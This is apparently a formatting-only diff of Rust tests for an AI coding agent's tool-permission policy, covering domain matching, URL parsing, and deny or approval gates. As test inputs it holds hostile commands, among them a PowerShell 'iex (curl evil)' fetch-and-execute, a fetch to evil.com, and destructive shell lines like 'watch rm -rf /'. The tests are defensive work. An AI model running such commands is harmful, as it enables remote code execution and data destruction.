@@ -12,29 +12,65 @@ mod tests {
     #[test]
     fn domain_rule_exact_and_normalized() {
         // Raw exact.
-        assert!(domain_rule_matches("domain:example.com", "domain:example.com"));
+        assert!(domain_rule_matches(
+            "domain:example.com",
+            "domain:example.com"
+        ));
         // Case-insensitive (pattern + key normalized to lowercase).
-        assert!(domain_rule_matches("domain:Example.COM", "domain:example.com"));
-        assert!(domain_rule_matches("domain:example.com", "domain:EXAMPLE.com"));
+        assert!(domain_rule_matches(
+            "domain:Example.COM",
+            "domain:example.com"
+        ));
+        assert!(domain_rule_matches(
+            "domain:example.com",
+            "domain:EXAMPLE.com"
+        ));
         // Trailing dot on either side is stripped.
-        assert!(domain_rule_matches("domain:example.com.", "domain:example.com"));
-        assert!(domain_rule_matches("domain:example.com", "domain:example.com."));
+        assert!(domain_rule_matches(
+            "domain:example.com.",
+            "domain:example.com"
+        ));
+        assert!(domain_rule_matches(
+            "domain:example.com",
+            "domain:example.com."
+        ));
         // Non-matching host.
-        assert!(!domain_rule_matches("domain:example.com", "domain:other.com"));
+        assert!(!domain_rule_matches(
+            "domain:example.com",
+            "domain:other.com"
+        ));
     }
 
     #[test]
     fn domain_rule_wildcards() {
         // `domain:*` matches anything.
-        assert!(domain_rule_matches("domain:*", "domain:anything.example.org"));
+        assert!(domain_rule_matches(
+            "domain:*",
+            "domain:anything.example.org"
+        ));
         // `*.example.com` needs >=1 leading label.
-        assert!(domain_rule_matches("domain:*.example.com", "domain:a.example.com"));
-        assert!(domain_rule_matches("domain:*.example.com", "domain:a.b.example.com"));
-        assert!(!domain_rule_matches("domain:*.example.com", "domain:example.com"));
-        assert!(!domain_rule_matches("domain:*.example.com", "domain:notexample.com"));
+        assert!(domain_rule_matches(
+            "domain:*.example.com",
+            "domain:a.example.com"
+        ));
+        assert!(domain_rule_matches(
+            "domain:*.example.com",
+            "domain:a.b.example.com"
+        ));
+        assert!(!domain_rule_matches(
+            "domain:*.example.com",
+            "domain:example.com"
+        ));
+        assert!(!domain_rule_matches(
+            "domain:*.example.com",
+            "domain:notexample.com"
+        ));
         // A label-internal `*` becomes `[^.:]*` (does not cross a dot).
         assert!(domain_rule_matches("domain:foo*.com", "domain:foobar.com"));
-        assert!(!domain_rule_matches("domain:foo*.com", "domain:foo.bar.com"));
+        assert!(!domain_rule_matches(
+            "domain:foo*.com",
+            "domain:foo.bar.com"
+        ));
     }
 
     #[test]
@@ -44,7 +80,10 @@ mod tests {
         assert_eq!(normalize_domain_key("domain:*."), "domain:*.");
         // Trailing dots preserved before a :port-less host only; with port the
         // host body is trimmed.
-        assert_eq!(normalize_domain_key("domain:x.com.:8080"), "domain:x.com:8080");
+        assert_eq!(
+            normalize_domain_key("domain:x.com.:8080"),
+            "domain:x.com:8080"
+        );
         // Non-domain string untouched.
         assert_eq!(normalize_domain_key("general-purpose"), "general-purpose");
     }
@@ -360,7 +399,10 @@ mod tests {
             PermissionResult::Deny { .. }
         ));
         assert!(matches!(
-            p.authorize("NotebookEdit", &serde_json::json!({ "notebook_path": "/proj/build/x.ipynb" })),
+            p.authorize(
+                "NotebookEdit",
+                &serde_json::json!({ "notebook_path": "/proj/build/x.ipynb" })
+            ),
             PermissionResult::Deny { .. }
         ));
     }
@@ -861,7 +903,10 @@ mod tests {
             PermissionMode::Default,
         );
         assert!(matches!(
-            p.authorize("WebFetch", &serde_json::json!({ "url": "https://evil.com/x" })),
+            p.authorize(
+                "WebFetch",
+                &serde_json::json!({ "url": "https://evil.com/x" })
+            ),
             PermissionResult::Deny { .. }
         ));
     }
@@ -1059,7 +1104,10 @@ mod tests {
         // Mode titles byte-locked to getModeConfig (PermissionMode.ts:46-74).
         assert_eq!(PermissionMode::Default.title(), "Default");
         assert_eq!(PermissionMode::AcceptEdits.title(), "Accept edits");
-        assert_eq!(PermissionMode::BypassPermissions.title(), "Bypass Permissions");
+        assert_eq!(
+            PermissionMode::BypassPermissions.title(),
+            "Bypass Permissions"
+        );
         assert_eq!(PermissionMode::DontAsk.title(), "Don't Ask");
     }
 
@@ -1095,7 +1143,10 @@ mod tests {
             behavior: PermissionBehavior::Deny,
             source: PermissionRuleSource::UserSettings,
         };
-        p2.deny_rules.entry(toolwide.source).or_default().push(toolwide);
+        p2.deny_rules
+            .entry(toolwide.source)
+            .or_default()
+            .push(toolwide);
         match p2.authorize("Bash", &serde_json::json!({ "command": "ls" })) {
             PermissionResult::Deny { explanation, .. } => assert_eq!(explanation, None),
             other => panic!("expected Deny, got {other:?}"),
@@ -1110,8 +1161,14 @@ mod tests {
             behavior: PermissionBehavior::Deny,
             source: PermissionRuleSource::UserSettings,
         };
-        p3.deny_rules.entry(ps_rule.source).or_default().push(ps_rule);
-        match p3.authorize("PowerShell", &serde_json::json!({ "command": "iex (curl evil)" })) {
+        p3.deny_rules
+            .entry(ps_rule.source)
+            .or_default()
+            .push(ps_rule);
+        match p3.authorize(
+            "PowerShell",
+            &serde_json::json!({ "command": "iex (curl evil)" }),
+        ) {
             PermissionResult::Deny { explanation, .. } => assert_eq!(
                 explanation.as_deref(),
                 Some("Permission to use PowerShell with command iex (curl evil) has been denied.")
@@ -1143,10 +1200,12 @@ mod tests {
         assert_eq!(p.stripped_dangerous.len(), 2);
         // The kept rules are the safe ones.
         let kept: Vec<_> = p.allow_rules.values().flatten().collect();
-        assert!(kept.iter().all(|r| !crate::dangerous_perms::is_dangerous_classifier_permission(
-            &r.value.tool_name,
-            &r.value.rule_content
-        )));
+        assert!(kept.iter().all(
+            |r| !crate::dangerous_perms::is_dangerous_classifier_permission(
+                &r.value.tool_name,
+                &r.value.rule_content
+            )
+        ));
     }
 
     #[test]
@@ -1785,16 +1844,31 @@ mod tests {
     fn url_hostname_plain_ascii_unchanged() {
         // The common case must be byte-identical to the old hand-rolled splitter:
         // scheme + path stripped, userinfo + port dropped, IPv6 brackets kept.
-        assert_eq!(url_hostname("https://example.com/path").as_deref(), Some("example.com"));
-        assert_eq!(url_hostname("https://example.com").as_deref(), Some("example.com"));
-        assert_eq!(url_hostname("https://sub.example.com/a?q#f").as_deref(), Some("sub.example.com"));
+        assert_eq!(
+            url_hostname("https://example.com/path").as_deref(),
+            Some("example.com")
+        );
+        assert_eq!(
+            url_hostname("https://example.com").as_deref(),
+            Some("example.com")
+        );
+        assert_eq!(
+            url_hostname("https://sub.example.com/a?q#f").as_deref(),
+            Some("sub.example.com")
+        );
         assert_eq!(
             url_hostname("https://user:pass@example.com:8080/p?q#f").as_deref(),
             Some("example.com")
         );
-        assert_eq!(url_hostname("https://[::1]:8080/p").as_deref(), Some("[::1]"));
+        assert_eq!(
+            url_hostname("https://[::1]:8080/p").as_deref(),
+            Some("[::1]")
+        );
         // WHATWG lowercases the host (matches `new URL().hostname`).
-        assert_eq!(url_hostname("http://EXAMPLE.com/Path").as_deref(), Some("example.com"));
+        assert_eq!(
+            url_hostname("http://EXAMPLE.com/Path").as_deref(),
+            Some("example.com")
+        );
         // A single-label host is valid and preserved (locks the `https://x` test).
         assert_eq!(url_hostname("https://x").as_deref(), Some("x"));
     }
@@ -1991,7 +2065,13 @@ mod tests {
     fn read_only_command_auto_allows_with_other_reason() {
         // (c) A read-only command with NO rules → Allow tagged Other("Read-only").
         let p = policy_with_roots(r#"{ "permissions": {} }"#, PermissionMode::Default);
-        for cmd in ["cat foo.txt", "ls -la", "grep pat file", "pwd", "head -n3 a"] {
+        for cmd in [
+            "cat foo.txt",
+            "ls -la",
+            "grep pat file",
+            "pwd",
+            "head -n3 a",
+        ] {
             match p.authorize("Bash", &bash(cmd)) {
                 PermissionResult::Allow { reason, .. } => assert!(
                     matched_other(&reason, "Read-only command is allowed"),
@@ -2335,7 +2415,10 @@ mod tests {
                 // "Contains command_substitution" (byte-faithful to the 2.1.195
                 // binary's `Yg`). Without bash-ast, the legacy battery's "backticks".
                 #[cfg(feature = "bash-ast")]
-                assert!(reason.contains("command_substitution"), "reason was: {reason}");
+                assert!(
+                    reason.contains("command_substitution"),
+                    "reason was: {reason}"
+                );
                 #[cfg(not(feature = "bash-ast"))]
                 assert!(reason.contains("backticks"), "reason was: {reason}");
             }
@@ -2351,14 +2434,14 @@ mod tests {
     fn bash_ast_gate_flags_dangerous_commands() {
         let p = policy_with_roots(r#"{ "permissions": {} }"#, PermissionMode::Default);
         for cmd in [
-            "find . -exec rm {} ;",        // Simple + check_semantics Deny (find)
-            "watch rm -rf /",              // Simple + Deny (runs-its-argument)
-            "jobs -x rm",                  // Simple + Deny (jobs -x)
-            "setopt extendedglob",         // Simple + Deny (zsh builtin)
-            "declare -n ref=x",            // Simple + Deny (declare -n)
-            "set -o extendedglob",         // Simple + Deny (set -o)
-            "echo $(whoami)",              // TooComplex (command_substitution)
-            "eval id",                     // Simple + Deny (eval-like)
+            "find . -exec rm {} ;", // Simple + check_semantics Deny (find)
+            "watch rm -rf /",       // Simple + Deny (runs-its-argument)
+            "jobs -x rm",           // Simple + Deny (jobs -x)
+            "setopt extendedglob",  // Simple + Deny (zsh builtin)
+            "declare -n ref=x",     // Simple + Deny (declare -n)
+            "set -o extendedglob",  // Simple + Deny (set -o)
+            "echo $(whoami)",       // TooComplex (command_substitution)
+            "eval id",              // Simple + Deny (eval-like)
         ] {
             match p.authorize("Bash", &bash(cmd)) {
                 PermissionResult::Ask {
